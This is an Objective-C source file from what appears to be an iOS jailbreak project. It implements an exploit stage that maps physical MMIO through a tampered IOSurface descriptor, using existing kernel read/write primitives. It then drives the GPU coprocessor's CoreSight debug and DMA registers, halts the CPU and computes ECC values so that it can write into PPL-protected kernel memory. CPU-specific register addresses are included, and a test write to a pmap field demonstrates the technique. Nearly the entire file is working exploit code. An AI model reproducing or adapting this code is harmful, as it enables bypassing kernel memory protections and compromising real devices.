//  GPU_CoreSight.m
//  XinaA15
//
//  Created by xina520
//
//

#include  <unistd.h>
#include  <stdio.h>
#include  <sys/sysctl.h>
#include  <pthread/pthread.h>
#include  <offsets.h>
#include  <IOSurface/IOSurfaceRef.h>
#include "Xina_rw.h"
#include "xina_offsets.h"
#include "kernel_utils.h"
#include "GPU_CoreSight.h"

#define ARM_PTE_TYPE              0x0000000000000003ull
#define ARM_PTE_TYPE_VALID        0x0000000000000003ull
#define ARM_PTE_TYPE_MASK         0x0000000000000002ull
#define ARM_TTE_TYPE_L3BLOCK      0x0000000000000002ull
#define ARM_PTE_ATTRINDX          0x000000000000001cull
#define ARM_PTE_NS                0x0000000000000020ull
#define ARM_PTE_AP                0x00000000000000c0ull
#define ARM_PTE_SH                0x0000000000000300ull
#define ARM_PTE_AF                0x0000000000000400ull
#define ARM_PTE_NG                0x0000000000000800ull
#define ARM_PTE_ZERO1             0x000f000000000000ull
#define ARM_PTE_HINT              0x0010000000000000ull
#define ARM_PTE_PNX               0x0020000000000000ull
#define ARM_PTE_NX                0x0040000000000000ull
#define ARM_PTE_ZERO2             0x0380000000000000ull
#define ARM_PTE_WIRED             0x0400000000000000ull
#define ARM_PTE_WRITEABLE         0x0800000000000000ull
#define ARM_PTE_ZERO3             0x3000000000000000ull
#define ARM_PTE_COMPRESSED_ALT    0x4000000000000000ull
#define ARM_PTE_COMPRESSED        0x8000000000000000ull

#define ARM_TTE_VALID         0x0000000000000001ull
#define ARM_TTE_TYPE_MASK     0x0000000000000002ull
#define ARM_TTE_TYPE_TABLE    0x0000000000000002ull
#define ARM_TTE_TYPE_BLOCK    0x0000000000000000ull
#define ARM_TTE_TABLE_MASK    0x0000fffffffff000ull
#define ARM_TTE_PA_MASK       0x0000fffffffff000ull

#define PMAP_TT_L0_LEVEL    0x0
#define PMAP_TT_L1_LEVEL    0x1
#define PMAP_TT_L2_LEVEL    0x2
#define PMAP_TT_L3_LEVEL    0x3

#define ARM_16K_TT_L0_SIZE          0x0000800000000000ull
#define ARM_16K_TT_L0_OFFMASK       0x00007fffffffffffull
#define ARM_16K_TT_L0_SHIFT         47
#define ARM_16K_TT_L0_INDEX_MASK    0x0000800000000000ull

#define ARM_16K_TT_L1_SIZE          0x0000001000000000ull
#define ARM_16K_TT_L1_OFFMASK       0x0000000fffffffffull
#define ARM_16K_TT_L1_SHIFT         36
#define ARM_16K_TT_L1_INDEX_MASK    0x0000007000000000ull

#define ARM_16K_TT_L2_SIZE          0x0000000002000000ull
#define ARM_16K_TT_L2_OFFMASK       0x0000000001ffffffull
#define ARM_16K_TT_L2_SHIFT         25
#define ARM_16K_TT_L2_INDEX_MASK    0x0000000ffe000000ull

#define ARM_16K_TT_L3_SIZE          0x0000000000004000ull
#define ARM_16K_TT_L3_OFFMASK       0x0000000000003fffull
#define ARM_16K_TT_L3_SHIFT         14
#define ARM_16K_TT_L3_INDEX_MASK    0x0000000001ffc000ull


#define DBGWRAP_DBGHALT          (1ULL << 31)
#define DBGWRAP_DBGACK           (1ULL << 28)

uint32_t sbox[] = {
     0x007, 0x00B, 0x00D, 0x013, 0x00E, 0x015, 0x01F, 0x016,
     0x019, 0x023, 0x02F, 0x037, 0x04F, 0x01A, 0x025, 0x043,
     0x03B, 0x057, 0x08F, 0x01C, 0x026, 0x029, 0x03D, 0x045,
     0x05B, 0x083, 0x097, 0x03E, 0x05D, 0x09B, 0x067, 0x117,
     0x02A, 0x031, 0x046, 0x049, 0x085, 0x103, 0x05E, 0x09D,
     0x06B, 0x0A7, 0x11B, 0x217, 0x09E, 0x06D, 0x0AB, 0x0C7,
     0x127, 0x02C, 0x032, 0x04A, 0x051, 0x086, 0x089, 0x105,
     0x203, 0x06E, 0x0AD, 0x12B, 0x147, 0x227, 0x034, 0x04C,
     0x052, 0x076, 0x08A, 0x091, 0x0AE, 0x106, 0x109, 0x0D3,
     0x12D, 0x205, 0x22B, 0x247, 0x07A, 0x0D5, 0x153, 0x22D,
     0x038, 0x054, 0x08C, 0x092, 0x061, 0x10A, 0x111, 0x206,
     0x209, 0x07C, 0x0BA, 0x0D6, 0x155, 0x193, 0x253, 0x28B,
     0x307, 0x0BC, 0x0DA, 0x156, 0x255, 0x293, 0x30B, 0x058,
     0x094, 0x062, 0x10C, 0x112, 0x0A1, 0x20A, 0x211, 0x0DC,
     0x196, 0x199, 0x256, 0x165, 0x259, 0x263, 0x30D, 0x313,
     0x098, 0x064, 0x114, 0x0A2, 0x15C, 0x0EA, 0x20C, 0x0C1,
     0x121, 0x212, 0x166, 0x19A, 0x299, 0x265, 0x2A3, 0x315,
     0x0EC, 0x1A6, 0x29A, 0x266, 0x1A9, 0x269, 0x319, 0x2C3,
     0x323, 0x068, 0x0A4, 0x118, 0x0C2, 0x122, 0x214, 0x141,
     0x221, 0x0F4, 0x16C, 0x1AA, 0x2A9, 0x325, 0x343, 0x0F8,
     0x174, 0x1AC, 0x2AA, 0x326, 0x329, 0x345, 0x383, 0x070,
     0x0A8, 0x0C4, 0x124, 0x218, 0x142, 0x222, 0x181, 0x241,
     0x178, 0x2AC, 0x32A, 0x2D1, 0x0B0, 0x0C8, 0x128, 0x144,
     0x1B8, 0x224, 0x1D4, 0x182, 0x242, 0x2D2, 0x32C, 0x281,
     0x351, 0x389, 0x1D8, 0x2D4, 0x352, 0x38A, 0x391, 0x0D0,
     0x130, 0x148, 0x228, 0x184, 0x244, 0x282, 0x301, 0x1E4,
     0x2D8, 0x354, 0x38C, 0x392, 0x1E8, 0x2E4, 0x358, 0x394,
     0x362, 0x3A1, 0x150, 0x230, 0x188, 0x248, 0x284, 0x302,
     0x1F0, 0x2E8, 0x364, 0x398, 0x3A2, 0x0E0, 0x190, 0x250,
     0x2F0, 0x288, 0x368, 0x304, 0x3A4, 0x370, 0x3A8, 0x3C4,
     0x160, 0x290, 0x308, 0x3B0, 0x3C8, 0x3D0, 0x1A0, 0x260,
     0x310, 0x1C0, 0x2A0, 0x3E0, 0x2C0, 0x320, 0x340, 0x380
};




uint32_t read_dword(uint64_t buffer) {
     return *(uint32_t *)buffer;
}

void write_dword(uint64_t addr, uint32_t value) {
     *(uint32_t *)addr= value;
}

uint64_t read_qword(uint64_t buffer) {
     return  *(uint64_t *)buffer;
}

void write_qword(uint64_t addr, uint64_t value) {
     *(uint64_t *)addr= value;
}


// Calculate ecc function based on the provided sbox and buffer
uint32_t calculate_ecc(const uint8_t* buffer) {
     uint32_t acc = 0;
     for (int i = 0; i < 8; ++i) {
          int pos = i * 4;
          uint32_t value = read_dword((uint64_t)buffer + pos);
          for (int j = 0; j < 32; ++j) {
               if (((value >> j) & 1) != 0) {
                    acc ^= sbox[32 * i + j];
               }
          }
     }
     return acc;
}


void dma_ctrl_1(uint64_t ctrl) {
     
     
     uint64_t value = read_qword(ctrl);
     printf("dma_ctrl_1 old value: %llx\n", value);
     write_qword(ctrl, value | 0x8000000000000001);
     sleep(1);
     printf("dma_ctrl_1  new value: %llx\n", *(uint64_t *)ctrl);
     while ((~read_qword(ctrl) & 0x8000000000000001) != 0) {
          sleep(1);
     }
}

void dma_ctrl_2(uint64_t ctrl,int flag) {
     uint64_t value = read_qword(ctrl);
     printf("dma_ctrl_2 old value: %llx\n", value);
     if (flag) {
          if ((value & 0x1000000000000000) == 0) {
               value = value | 0x1000000000000000;
               write_qword(ctrl, value);
               printf("dma_ctrl_2  new value: %llx\n", *(uint64_t *)ctrl);
          }
     } else {
          if ((value & 0x1000000000000000) != 0) {
               value = value & ~0x1000000000000000;
               write_qword(ctrl, value);
               printf("dma_ctrl_2  new value: %llx\n", *(uint64_t *)ctrl);
          }
     }
}

void dma_ctrl_3(uint64_t ctrl,uint64_t value) {
     value = value | 0x8000000000000000;
     uint64_t ctrl_value =read_qword(ctrl);
     printf("dma_ctrl_3 old value: %llx\n", ctrl_value);
     write_qword(ctrl, ctrl_value & value);
     printf("dma_ctrl_3  new value: %llx\n", *(uint64_t *)ctrl);
     while ((read_qword(ctrl) & 0x8000000000000001) != 0) {
          sleep(1);
     }
}



void dma_init(uint64_t base6140008, uint64_t base6140108, uint64_t original_value_0x206140108) {
     dma_ctrl_1(base6140108);
     dma_ctrl_2(base6140008,0);
     dma_ctrl_3(base6140108,original_value_0x206140108);
}

void dma_done(uint64_t base6140008, uint64_t base6140108, uint64_t original_value_0x206140108) {
     dma_ctrl_1(base6140108);
     dma_ctrl_2(base6140008,1);
     dma_ctrl_3(base6140108,original_value_0x206140108);
}



void ml_dbgwrap_halt_cpu(uint64_t coresight_base_utt) {
     uint64_t dbgWrapReg = read_qword(coresight_base_utt);
     printf("ml_dbgwrap_halt_cpu old value: %llx\n", dbgWrapReg);
     if ((dbgWrapReg & 0x90000000) != 0) return;
     write_qword(coresight_base_utt, dbgWrapReg | DBGWRAP_DBGHALT);// Clear all other writable bits besides dbgHalt; none of the power-down or reset bits must be set.
     printf("ml_dbgwrap_halt_cpu  new value: %llx\n", *(uint64_t *)coresight_base_utt);
     while (1) {
          if ((read_qword(coresight_base_utt) & DBGWRAP_DBGACK) != 0) {
               break;
          }
     }
}

void ml_dbgwrap_unhalt_cpu(uint64_t coresight_base_utt) {
     uint64_t dbgWrapReg = read_qword(coresight_base_utt);
     printf("ml_dbgwrap_unhalt_cpu curr value: %llx\n", dbgWrapReg);
     dbgWrapReg = (dbgWrapReg & 0xFFFFFFFF2FFFFFFF) | 0x40000000;
     write_qword(coresight_base_utt, dbgWrapReg);
     printf("ml_dbgwrap_unhalt_cpu  back value: %llx\n", *(uint64_t *)coresight_base_utt);
     while (1) {
          if ((read_qword(coresight_base_utt) & DBGWRAP_DBGACK) == 0) {
               break;
          }
     }
}

uint64_t phys_tokv(uint64_t pa)
{
     const uint64_t PTOV_TABLE_SIZE = 8;
     
     uint64_t gPhysBase;
     uint64_t gPhysSize;
     uint64_t gVirtBase;
     struct ptov_table_entry {
          uint64_t pa;
          uint64_t va;
          uint64_t len;
     } ptov_table[8];
     
     kread(SLIDE(gOffsets.gPhysBase), &gPhysBase, sizeof(gPhysBase));
     kread(SLIDE(gOffsets.gPhysSize), &gPhysSize, sizeof(gPhysSize));
     kread(SLIDE(gOffsets.gVirtBase), &gVirtBase, sizeof(gVirtBase));
     kread(SLIDE(gOffsets.ptov_table), ptov_table, sizeof(ptov_table));
     
     for (uint64_t i = 0; (i < PTOV_TABLE_SIZE) && (ptov_table[i].len != 0); i++) {
          if ((pa >= ptov_table[i].pa) && (pa < (ptov_table[i].pa + ptov_table[i].len))) {
               return pa - ptov_table[i].pa + ptov_table[i].va;
          }
     }
     
     assert(!((pa < gPhysBase) || ((pa - gPhysBase) >= gPhysSize)));
     return pa - gPhysBase + gVirtBase;
}

//form kfd
uint64_t v_tophys(uint64_t ttbr0_va_kaddr,uint64_t ttbr1_va_kaddr, uint64_t va)
{
     /*
      * pmap stuff
      */
     
     const uint64_t ROOT_LEVEL = PMAP_TT_L1_LEVEL;
     const uint64_t LEAF_LEVEL = PMAP_TT_L3_LEVEL;
     
     uint64_t pa = 0;
     uint64_t tt_kaddr = (va >> 63) ? ttbr1_va_kaddr : ttbr0_va_kaddr;
     
     for (uint64_t cur_level = ROOT_LEVEL; cur_level <= LEAF_LEVEL; cur_level++) {
          uint64_t offmask, shift, index_mask, valid_mask, type_mask, type_block;
          switch (cur_level) {
               case PMAP_TT_L0_LEVEL: {
                    offmask = ARM_16K_TT_L0_OFFMASK;
                    shift = ARM_16K_TT_L0_SHIFT;
                    index_mask = ARM_16K_TT_L0_INDEX_MASK;
                    valid_mask = ARM_TTE_VALID;
                    type_mask = ARM_TTE_TYPE_MASK;
                    type_block = ARM_TTE_TYPE_BLOCK;
                    break;
               }
               case PMAP_TT_L1_LEVEL: {
                    offmask = ARM_16K_TT_L1_OFFMASK;
                    shift = ARM_16K_TT_L1_SHIFT;
                    index_mask = ARM_16K_TT_L1_INDEX_MASK;
                    valid_mask = ARM_TTE_VALID;
                    type_mask = ARM_TTE_TYPE_MASK;
                    type_block = ARM_TTE_TYPE_BLOCK;
                    break;
               }
               case PMAP_TT_L2_LEVEL: {
                    offmask = ARM_16K_TT_L2_OFFMASK;
                    shift = ARM_16K_TT_L2_SHIFT;
                    index_mask = ARM_16K_TT_L2_INDEX_MASK;
                    valid_mask = ARM_TTE_VALID;
                    type_mask = ARM_TTE_TYPE_MASK;
                    type_block = ARM_TTE_TYPE_BLOCK;
                    break;
               }
               case PMAP_TT_L3_LEVEL: {
                    offmask = ARM_16K_TT_L3_OFFMASK;
                    shift = ARM_16K_TT_L3_SHIFT;
                    index_mask = ARM_16K_TT_L3_INDEX_MASK;
                    valid_mask = ARM_PTE_TYPE_VALID;
                    type_mask = ARM_PTE_TYPE_MASK;
                    type_block = ARM_TTE_TYPE_L3BLOCK;
                    break;
               }
               default: {
                    printf("bad pmap tt level");
                    return 0;
               }
          }
          
          uint64_t tte_index = (va & index_mask) >> shift;
          uint64_t tte_kaddr = tt_kaddr + (tte_index * sizeof(uint64_t));
          uint64_t tte = 0;
          KernelRead(tte_kaddr, &tte, sizeof(tte));
          
          if ((tte & valid_mask) != valid_mask) {
               return 0;
          }
          
          if ((tte & type_mask) == type_block) {
               pa = ((tte & ARM_TTE_PA_MASK & ~offmask) | (va & offmask));
               break;
          }
          
          tt_kaddr = phys_tokv(tte & ARM_TTE_TABLE_MASK);
     }
     
     return pa;
}


mach_port_t IO_GetSurfacePort(uint64_t magic)
{
     IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
          (__bridge NSString *)kIOSurfaceWidth : @120,
          (__bridge NSString *)kIOSurfaceHeight : @120,
          (__bridge NSString *)kIOSurfaceBytesPerElement : @4,
     });
     mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
     *((uint64_t *)IOSurfaceGetBaseAddress(surfaceRef)) = magic;
     IOSurfaceDecrementUseCount(surfaceRef);
     CFRelease(surfaceRef);
     return port;
}

//form fugu
uint64_t IO_GetMMAP(uint64_t phys, uint64_t size)
{
     mach_port_t surfaceMachPort = IO_GetSurfacePort(1337);
     uint64_t surface_port_addr = FindPortAddress(surfaceMachPort);
     uint64_t kobject =KernelRead_64bits_ptr(surface_port_addr + off_ip_kobject);
     uint64_t surface = KernelRead_64bits_ptr(kobject + 0x18);
     uint64_t desc = KernelRead_64bits_ptr(surface + 0x38);
     uint64_t ranges = KernelRead_64bits_ptr(desc + 0x60);
     KernelWrite_64bits(ranges, phys);
     KernelWrite_64bits(ranges+8, size);
     KernelWrite_64bits(desc + 0x50, size);
     KernelWrite_64bits(desc + 0x70, 0);
     KernelWrite_64bits(desc + 0x18, 0);
     KernelWrite_64bits(desc + 0x90, 0);
     KernelWrite_8bits(desc + 0x88, 1);
     uint32_t flags = KernelRead_32bits(desc + 0x20);
     KernelWrite_32bits(desc + 0x20,  (flags & ~0x410) | 0x20);
     KernelWrite_64bits(desc + 0x28, 0);
     IOSurfaceRef mappedSurfaceRef = IOSurfaceLookupFromMachPort(surfaceMachPort);
     return (uint64_t)IOSurfaceGetBaseAddress(mappedSurfaceRef);
}

//form 37c3
void write_data_with_mmio(uint64_t ttbr0_va_kaddr, uint64_t ttbr1_va_kaddr, uint64_t kernel_p, uint64_t base6150000, uint64_t mask, uint64_t i, uint64_t pass) {
    uint64_t phys_addr = v_tophys(ttbr0_va_kaddr, ttbr1_va_kaddr, kernel_p);
    printf("kernel_addr phys_addr: %llx %llx\n", kernel_p, phys_addr);
    uint64_t base6150040 = base6150000 + 0x40;
    uint64_t base6150048 = base6150000 + 0x48;
    uint64_t old_p = 0x2000000 | (phys_addr & 0x3FF0); //获取物理地址高位
    uint64_t w_p = 0x2000000 | (phys_addr & 0x3FC0); //对齐
    write_qword(base6150040, w_p);//
    uint64_t fix = old_p - w_p; //计算需要修复的原值偏移
    uint8_t data[0x40] = {0};
    KernelRead(kernel_p - fix, data, 0x40);//用原值填充数据
    memcpy((void *)&data[fix], (void *)&pass, sizeof(uint64_t)); //把需要写入的部分重新付值;
    uint32_t ecc1 =calculate_ecc(data);
    uint32_t ecc2 =calculate_ecc(data + 0x20);
    int pos = 0;
    while (pos < 0x40) {
        write_qword(base6150048, read_qword((uint64_t)data + pos));
        pos += 8;
    }
    uint64_t phys_addr_upper = ((((phys_addr >> 14) & mask) << 18) & 0x3FFFFFFFFFFFF);
    uint64_t value = phys_addr_upper | ((uint64_t)ecc1 << i) | ((uint64_t)ecc2 << 50) | 0x1F;
    write_qword(base6150048, value);
}


void  pplwrite_test(void)
{
    uint64_t vm_map = KernelRead_64bits_ptr(current_task+off_task_map);
    uint64_t pmap= KernelRead_64bits_ptr(vm_map +off_task_map_pmap);
    uint64_t ttbr0_va_kaddr =KernelRead_64bits(pmap + 0);
    uint64_t vm_map1 = KernelRead_64bits_ptr(kernel_task+off_task_map);
    uint64_t pmap1= KernelRead_64bits_ptr(vm_map1 +off_task_map_pmap);
    uint64_t ttbr1_va_kaddr =KernelRead_64bits(pmap1 + 0);
    
    dispatch_queue_t queue = dispatch_queue_create("com.example.my_queue", DISPATCH_QUEUE_SERIAL);
    dispatch_queue_set_specific(queue, CFRunLoopGetMain(), CFRunLoopGetMain(), NULL);
    dispatch_async(queue, ^{
         uint32_t cpufamily;
         size_t len = sizeof(cpufamily);
         if (sysctlbyname("hw.cpufamily", &cpufamily, &len, NULL, 0) == -1) {
              perror("sysctl");
         } else {
              printf("CPU Family: %x\n", cpufamily);
         }
         
         uint64_t i = 0, mask=0, base=0;
         uint32_t command = 0;
         bool isa15a16=false;
         switch (cpufamily) {
              case 0x8765EDEA:   // CPUFAMILY_ARM_EVEREST_SAWTOOTH (A16)
                   base = 0x23B700408;
                   command = 0x1F0023FF;
                   i = 8;
                   mask = 0x7FFFFFF;
                 isa15a16=true;
                   break;
              case 0xDA33D83D:   // CPUFAMILY_ARM_AVALANCHE_BLIZZARD (A15)
                   base = 0x23B7003C8;
                   command = 0x1F0023FF;
                   i = 8;
                   mask = 0x3FFFFF;
                   isa15a16=true;
                   break;
              case 0x1B588BB3:   // CPUFAMILY_ARM_FIRESTORM_ICESTORM (A14)
                   base = 0x23B7003D0;
                   command = 0x1F0023FF;
                   i = 0x28;
                   mask = 0x3FFFFF;
                   break;
              case 0x462504D2:   // CPUFAMILY_ARM_LIGHTNING_THUNDER (A13)
                   base = 0x23B080390;
                   command = 0x1F0003FF;
                   i = 0x28;
                   mask = 0x3FFFFF;
                   break;
              case 0x07D34B9F:   // CPUFAMILY_ARM_VORTEX_TEMPEST (A12)
                   base = 0x23B080388;
                   command = 0x1F0003FF;
                   i = 0x28;
                   mask = 0x3FFFFF;
                   break;
              default:
                 printf("Unsupported CPU family %x\n", cpufamily);
                   return;
         }
         printf("base: %llx\n", base);
         uint64_t  base23b7003c8 = IO_GetMMAP(base,0x8);
         printf("base23b7003c8: %llx\n", base23b7003c8);
         printf("*base23b7003c8: %x\n", * (uint32_t *)base23b7003c8);
         
         uint64_t  base6040000= IO_GetMMAP(0x206040000,0x100);  //GPU 协处理器的 CoreSight MMIO 调试寄存器块
         printf("base6040000: %llx\n", base6040000);
         uint64_t  base6140000= IO_GetMMAP(0x206140000,0x200);
         printf("base6140000: %llx\n", base6140000);
         uint64_t  base6150000= IO_GetMMAP(0x206150000,0x100);
         printf("base6150000: %llx\n", base6150000);
         uint64_t base6140008= base6140000+0x8; // 控制启用/禁用和运行漏洞利用所使用的硬件功能
         printf("base6140008: %llx\n", base6140008);
         uint64_t base6140108= base6140000+0x108; // 控制启用/禁用和运行漏洞利用所使用的硬件功能
         printf("base6140108: %llx\n", base6140108);
         
         uint64_t   original_value_0x206140108= *(uint64_t *)base6140108;
         printf("original_value_0x206140108: %llx\n", original_value_0x206140108);
         
         if ((~read_dword(base23b7003c8) & 0xF) != 0){
              write_dword(base23b7003c8, command);
              printf("*base23b7003c8: %x\n", * (uint32_t *)base23b7003c8);
              while (1) {
                   if ((~read_dword(base23b7003c8) & 0xF) == 0) {
                        break;
                   }
              }
         }
         uint64_t base6150020= base6150000+0x20;
         uint64_t base6150020_back = read_qword(base6150020);
         if (isa15a16) write_qword(base6150020,1); // a15 a16需要
         ml_dbgwrap_halt_cpu(base6040000);
         dma_init(base6140008,base6140108,original_value_0x206140108);

         uint64_t test_p=pmap+0x70; //test write
        
         write_data_with_mmio(ttbr0_va_kaddr,ttbr1_va_kaddr, test_p,base6150000,mask,i,0x4141414141414141);
         
         dma_done(base6140008,base6140108,original_value_0x206140108);
         ml_dbgwrap_unhalt_cpu(base6040000);
        
         if (isa15a16) write_qword(base6150020,base6150020_back);
         uint64_t test= KernelRead_64bits(test_p);
         printf("%llx  : %llx\n", test_p,test );
    });
    
}
